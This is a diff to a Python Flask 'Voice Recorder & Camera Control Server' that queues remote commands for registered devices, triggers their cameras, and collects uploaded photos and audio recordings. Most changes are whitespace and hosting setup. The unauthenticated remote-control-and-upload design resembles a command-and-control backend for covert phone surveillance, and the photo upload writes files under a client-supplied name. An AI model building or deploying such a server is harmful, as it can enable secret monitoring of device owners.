@@ -28,10 +28,8 @@ def home():
 
 def get_server_ip():
     try:
-        import socket
-        hostname = socket.gethostname()
-        local_ip = socket.gethostbyname(hostname)
-        return local_ip
+        # Render pe hostname return karo
+        return "your-app-name.onrender.com"  # TODO: Replace with your actual app name
     except:
         return "localhost"
 
@@ -40,17 +38,17 @@ def get_server_ip():
 def upload_photo():
     try:
         print("📸 Photo upload request received")
-        
+
         device_id = request.headers.get('X-Device-Id', 'unknown')
         filename = request.headers.get('X-File-Name', f'photo_{int(time.time())}.jpg')
-        
+
         # Save photo file
         file_path = os.path.join(UPLOAD_FOLDER, filename)
         with open(file_path, 'wb') as f:
             f.write(request.data)
-        
+
         file_size = os.path.getsize(file_path)
-        
+
         # Store file info
         file_info = {
             'filename': filename,
@@ -59,18 +57,18 @@ def upload_photo():
             'size': file_size,
             'type': 'photo'
         }
-        
+
         uploaded_files.append(file_info)
-        
+
         print(f"✅ Photo uploaded: {filename} from device {device_id}, size: {file_size} bytes")
-        
+
         return jsonify({
             'status': 'success',
             'message': 'Photo uploaded successfully',
             'filename': filename,
             'size': file_size
         })
-        
+
     except Exception as e:
         print(f"❌ Photo upload error: {e}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
@@ -82,27 +80,27 @@ def camera_control():
         data = request.json
         command = data.get('command')
         action = data.get('action')
-        
+
         print(f"📷 Camera command received: {command}, action: {action}")
-        
+
         if not command:
             return jsonify({'status': 'error', 'message': 'No camera command provided'})
-        
+
         # Send camera command to all connected devices
         sent_count = 0
         for dev_id in commands_queue:
             commands_queue[dev_id].append(command)
             sent_count += 1
-        
+
         print(f"✅ Camera command '{command}' sent to {sent_count} devices")
-        
+
         return jsonify({
             'status': 'success',
             'message': f'Camera command {command} sent to devices',
             'devices_count': sent_count,
             'command': command
         })
-        
+
     except Exception as e:
         print(f"❌ Camera control error: {e}")
         return jsonify({'status': 'error', 'message': str(e)})
@@ -112,27 +110,27 @@ def camera_control():
 def upload_file():
     try:
         print("📁 File upload request received")
-        
+
         if 'audio_file' not in request.files:
             return jsonify({'status': 'error', 'message': 'No file provided'}), 400
-        
+
         file = request.files['audio_file']
         device_id = request.form.get('device_id', 'unknown')
-        
+
         if file.filename == '':
             return jsonify({'status': 'error', 'message': 'No file selected'}), 400
-        
+
         # Generate unique filename
         file_extension = file.filename.split('.')[-1] if '.' in file.filename else '3gp'
         unique_filename = f"{device_id}_{int(time.time())}.{file_extension}"
         file_path = os.path.join(UPLOAD_FOLDER, unique_filename)
-        
+
         # Save file
         file.save(file_path)
-        
+
         # Get file size
         file_size = os.path.getsize(file_path)
-        
+
         # Store file info
         file_info = {
             'filename': unique_filename,
@@ -142,18 +140,18 @@ def upload_file():
             'original_name': file.filename,
             'type': 'audio'
         }
-        
+
         uploaded_files.append(file_info)
-        
+
         print(f"✅ File uploaded: {unique_filename} from device {device_id}, size: {file_size} bytes")
-        
+
         return jsonify({
             'status': 'success',
             'message': 'File uploaded successfully',
             'filename': unique_filename,
             'size': file_size
         })
-        
+
     except Exception as e:
         print(f"❌ File upload error: {e}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
@@ -166,13 +164,13 @@ def serve_file(filename):
         if not os.path.exists(file_path):
             print(f"❌ File not found: {filename}")
             return "File not found", 404
-        
+
         # Determine content type based on file extension
         if filename.lower().endswith(('.jpg', '.jpeg', '.png', '.gif')):
             mimetype = 'image/jpeg'
         else:
             mimetype = 'audio/3gpp'
-            
+
         return send_from_directory(UPLOAD_FOLDER, filename, 
                                  as_attachment=False,
                                  mimetype=mimetype)
@@ -186,14 +184,14 @@ def get_files():
     try:
         # Sort files by upload time (newest first)
         sorted_files = sorted(uploaded_files, key=lambda x: x['upload_time'], reverse=True)
-        
+
         # Check if files actually exist on disk
         valid_files = []
         for file_info in sorted_files:
             file_path = os.path.join(UPLOAD_FOLDER, file_info['filename'])
             if os.path.exists(file_path):
                 valid_files.append(file_info)
-        
+
         return jsonify({'files': valid_files})
     except Exception as e:
         print(f"❌ Get files error: {e}")
@@ -223,7 +221,7 @@ def register_device():
     try:
         device_id = request.json.get('device_id')
         print(f"📱 Device registration attempt: {device_id}")
-        
+
         if device_id:
             connected_devices[device_id] = {
                 'status': 'connected',
@@ -233,9 +231,9 @@ def register_device():
             commands_queue[device_id] = []
             print(f"✅ Device registered: {device_id}")
             return jsonify({'status': 'registered', 'device_id': device_id})
-        
+
         return jsonify({'status': 'error', 'message': 'No device ID'})
-    
+
     except Exception as e:
         print(f"❌ Registration error: {e}")
         return jsonify({'status': 'error', 'message': str(e)})
@@ -247,17 +245,17 @@ def get_commands(device_id):
         if device_id in commands_queue:
             # Update last seen
             connected_devices[device_id]['last_seen'] = time.time()
-            
+
             # Return pending commands
             commands = commands_queue[device_id].copy()
             commands_queue[device_id] = []  # Clear commands after sending
-            
+
             print(f"📤 Sending {len(commands)} commands to {device_id}: {commands}")
             return jsonify({'commands': commands})
-        
+
         print(f"❌ Device {device_id} not found")
         return jsonify({'commands': []})
-    
+
     except Exception as e:
         print(f"❌ Get commands error: {e}")
         return jsonify({'commands': []})
@@ -268,12 +266,12 @@ def send_command():
     try:
         command = request.json.get('command')
         device_id = request.json.get('device_id')
-        
+
         print(f"📨 Received command '{command}' for device '{device_id}'")
-        
+
         if not command:
             return jsonify({'status': 'error', 'message': 'No command provided'})
-        
+
         sent_count = 0
         if device_id:
             # Send to specific device
@@ -289,13 +287,13 @@ def send_command():
                 commands_queue[dev_id].append(command)
                 sent_count += 1
             print(f"✅ Command '{command}' sent to all {sent_count} devices")
-        
+
         return jsonify({
             'status': 'command_sent', 
             'command': command,
             'devices_count': sent_count
         })
-    
+
     except Exception as e:
         print(f"❌ Send command error: {e}")
         return jsonify({'status': 'error', 'message': str(e)})
@@ -307,16 +305,16 @@ def update_status():
         device_id = request.json.get('device_id')
         status = request.json.get('status')
         recording = request.json.get('recording', False)
-        
+
         print(f"📊 Device {device_id} status update: {status}, recording: {recording}")
-        
+
         if device_id in connected_devices:
             connected_devices[device_id]['status'] = status
             connected_devices[device_id]['recording'] = recording
             connected_devices[device_id]['last_seen'] = time.time()
-        
+
         return jsonify({'status': 'updated'})
-    
+
     except Exception as e:
         print(f"❌ Update status error: {e}")
         return jsonify({'status': 'error', 'message': str(e)})
@@ -331,23 +329,24 @@ def get_devices():
         for dev_id, device_data in connected_devices.items():
             if current_time - device_data['last_seen'] > 60:
                 expired_devices.append(dev_id)
-        
+
         for dev_id in expired_devices:
             del connected_devices[dev_id]
             if dev_id in commands_queue:
                 del commands_queue[dev_id]
             print(f"🗑️ Removed expired device: {dev_id}")
-        
+
         print(f"📋 Current devices: {len(connected_devices)}")
         return jsonify({'devices': connected_devices})
-    
+
     except Exception as e:
         print(f"❌ Get devices error: {e}")
         return jsonify({'devices': {}})
 
 if __name__ == '__main__':
-    print('🚀 Starting Voice Recorder & Camera Control Server...')
-    print('📡 Web Panel: http://localhost:5000')
+    port = int(os.environ.get('PORT', 5000))
+    print(f'🚀 Starting Voice Recorder & Camera Control Server...')
+    print(f'📡 Web Panel: http://0.0.0.0:{port}')
     print('📍 Available Endpoints:')
     print('   - GET  /')
     print('   - POST /camera (camera control)')
@@ -362,4 +361,4 @@ if __name__ == '__main__':
     print('   - POST /update_status')
     print('   - GET  /get_devices')
     print('⏹️  Press Ctrl+C to stop')
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    app.run(host='0.0.0.0', port=port, debug=False)  # debug=False for production
